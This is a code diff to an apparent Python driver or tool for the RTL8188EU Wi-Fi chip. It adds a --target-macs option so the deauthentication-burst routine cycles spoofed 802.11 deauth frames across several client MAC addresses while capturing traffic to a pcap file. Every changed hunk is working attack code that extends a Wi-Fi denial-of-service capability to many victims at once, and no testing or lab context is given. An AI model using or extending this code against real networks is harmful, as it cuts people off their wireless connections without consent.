@@ -1878,6 +1878,15 @@ class RTL8188EU:
         if interval_ms <= 0:
             raise ValueError("interval_ms must be > 0")
 
+        raw_targets = [x.strip() for x in re.split(r"[,\s]+", str(dest or "")) if x.strip()]
+        targets: List[str] = []
+        for t in raw_targets:
+            if t not in targets:
+                targets.append(t)
+        if not targets:
+            raise ValueError("dest must not be empty")
+        target_idx = 0
+
         end: Optional[float]
         start = time.monotonic()
         end = None if duration_s <= 0 else (start + float(duration_s))
@@ -1899,9 +1908,11 @@ class RTL8188EU:
                 break
 
             if now >= next_send:
+                current_dest = targets[target_idx % len(targets)]
+                target_idx += 1
                 for _ in range(burst_size):
                     sent += 1
-                    if self.send_deauth(dest=dest, bssid=bssid, source=source, reason=reason):
+                    if self.send_deauth(dest=current_dest, bssid=bssid, source=source, reason=reason):
                         tx_ok += 1
                     else:
                         tx_err += 1
@@ -2097,6 +2108,7 @@ def main(argv: Sequence[str]) -> int:
     parser.add_argument("--deauth", action="store_true", help="Send Deauthentication frame")
     parser.add_argument("--deauth-burst", action="store_true", help="Send deauth bursts and capture to pcap")
     parser.add_argument("--target-mac", type=str, default="", help="Target MAC address (DA)")
+    parser.add_argument("--target-macs", type=str, default="", help="Multiple target MACs, comma/space-separated")
     parser.add_argument("--bssid", type=str, default="", help="BSSID (and Source MAC by default)")
     parser.add_argument("--source-mac", type=str, default=None, help="Source MAC (SA) if different from BSSID")
     parser.add_argument("--reason", type=int, default=8, help="Reason code (default 8)")
@@ -2171,8 +2183,9 @@ def main(argv: Sequence[str]) -> int:
         if args.init_only:
             return 0
         if args.deauth_burst:
-            if not args.target_mac or not args.bssid:
-                sys.stderr.write("Error: --target-mac and --bssid are required for --deauth-burst\n")
+            target_spec = str(args.target_macs or "").strip() or str(args.target_mac or "").strip()
+            if not target_spec or not args.bssid:
+                sys.stderr.write("Error: --target-mac/--target-macs and --bssid are required for --deauth-burst\n")
                 return 1
             if not args.pcap:
                 sys.stderr.write("Error: --pcap is required for --deauth-burst\n")
@@ -2185,7 +2198,7 @@ def main(argv: Sequence[str]) -> int:
                 try:
                     sent, written = chip.deauth_burst_capture_pcap(
                         pcap=pcap,
-                        dest=args.target_mac,
+                        dest=target_spec,
                         bssid=args.bssid,
                         source=args.source_mac,
                         reason=args.reason,
